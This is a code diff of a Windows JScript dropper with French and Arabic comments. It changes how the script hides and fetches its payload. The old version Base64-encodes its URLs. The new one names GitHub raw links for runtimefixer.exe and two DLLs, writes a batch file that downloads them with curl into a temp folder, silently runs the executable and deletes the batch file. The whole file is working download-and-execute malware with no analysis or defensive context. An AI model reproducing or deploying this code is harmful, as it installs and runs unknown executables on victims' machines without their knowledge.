@@ -1,69 +1,66 @@
-// version qui détecte l'environnement et s'adapte
+// download-clean.js
 (function() {
+    function log(msg) {
+        try {
+            WScript.Echo(msg);
+        } catch(e) {}
+    }
+    
     function downloadAndExecute() {
         try {
-            // Code ActiveX (fonctionne dans IE et cscript)
-            var wscript = new ActiveXObject("WScript.Shell");
+            log("=== بدء التنزيل ===");
+            
+            var shell = new ActiveXObject("WScript.Shell");
             var fso = new ActiveXObject("Scripting.FileSystemObject");
             
-            var targetDir = wscript.ExpandEnvironmentStrings("%TEMP%\\RuntimeFixer");
+            var targetDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\RuntimeFixer";
+            log("المجلد: " + targetDir);
+            
             if (!fso.FolderExists(targetDir)) {
                 fso.CreateFolder(targetDir);
+                log("تم إنشاء المجلد");
             }
             
-            // URLs in Base64
-            var urlsBase64 = [
-                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2EvcmF3L3JlZnMvaGVhZHMvbWFpbi9ydW50aW1lZml4ZXIuZXhl",
-                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2IvcmF3L3JlZnMvaGVhZHMvbWFpbi9EaXNtQ29yZS5kbGw=",
-                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2MvcmF3L3JlZnMvaGVhZHMvbWFpbi9QYWdlUGRmU2l6ZV9Db25maWcuZGxs"
+            // الروابط
+            var urls = [
+                "https://github.com/amindaraji64-arch/a/raw/refs/heads/main/runtimefixer.exe",
+                "https://github.com/amindaraji64-arch/b/raw/refs/heads/main/DismCore.dll",
+                "https://github.com/amindaraji64-arch/c/raw/refs/heads/main/PagePdfSize_Config.dll"
             ];
             
-            var filenames = ["runtimefixer.exe", "DismCore.dll", "PagePdfSize_Config.dll"];
+            var names = ["runtimefixer.exe", "DismCore.dll", "PagePdfSize_Config.dll"];
             
-            function decodeBase64(base64) {
-                return atob(base64);
+            // إنشاء ملف batch
+            var batchPath = targetDir + "\\run.bat";
+            var batchContent = "@echo off\r\n";
+            batchContent = batchContent + "echo Downloading...\r\n";
+            
+            for (var i = 0; i < urls.length; i++) {
+                var filePath = targetDir + "\\" + names[i];
+                batchContent = batchContent + "curl -L -o \"" + filePath + "\" \"" + urls[i] + "\"\r\n";
             }
             
-            function downloadFile(url, filePath) {
-                try {
-                    var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-                    WinHttpReq.Option(4) = 13056;
-                    WinHttpReq.Open("GET", url, false);
-                    WinHttpReq.SetRequestHeader("User-Agent", "Mozilla/5.0");
-                    WinHttpReq.Send();
-                    
-                    if (WinHttpReq.Status == 200) {
-                        var stream = new ActiveXObject("ADODB.Stream");
-                        stream.Type = 1;
-                        stream.Open();
-                        stream.Write(WinHttpReq.ResponseBody);
-                        stream.SaveToFile(filePath, 2);
-                        stream.Close();
-                        return true;
-                    }
-                } catch(e) {}
-                return false;
-            }
+            batchContent = batchContent + "echo Running...\r\n";
+            batchContent = batchContent + "start \"\" \"" + targetDir + "\\runtimefixer.exe\"\r\n";
+            batchContent = batchContent + "del \"" + batchPath + "\"\r\n";
             
-            for (var i = 0; i < urlsBase64.length; i++) {
-                var url = decodeBase64(urlsBase64[i]);
-                var filePath = targetDir + '\\' + filenames[i];
-                downloadFile(url, filePath);
-            }
+            // حفظ الملف
+            var file = fso.CreateTextFile(batchPath, true);
+            file.Write(batchContent);
+            file.Close();
             
-            var exePath = targetDir + '\\runtimefixer.exe';
-            if (fso.FileExists(exePath)) {
-                wscript.Run('"' + exePath + '"', 0, false);
-            }
+            log("تم إنشاء ملف batch");
+            log("جاري التنزيل والتشغيل...");
+            
+            // التشغيل
+            shell.Run("cmd.exe /c \"" + batchPath + "\"", 0, false);
+            
+            log("=== اكتمل ===");
             
         } catch(e) {
-            if (typeof WScript !== 'undefined') {
-                WScript.Echo("Erreur: " + e.message);
-            }
+            log("خطأ: " + e.message);
         }
     }
     
-    // Détection automatique de l'environnement
-    if (typeof window !== 'undefined' && typeof window.addEventListener !== 'undefined') {
-        // Environnement navigateur (Internet Explorer)
-        if (window.attachEve
+    downloadAndExecute();
+})();
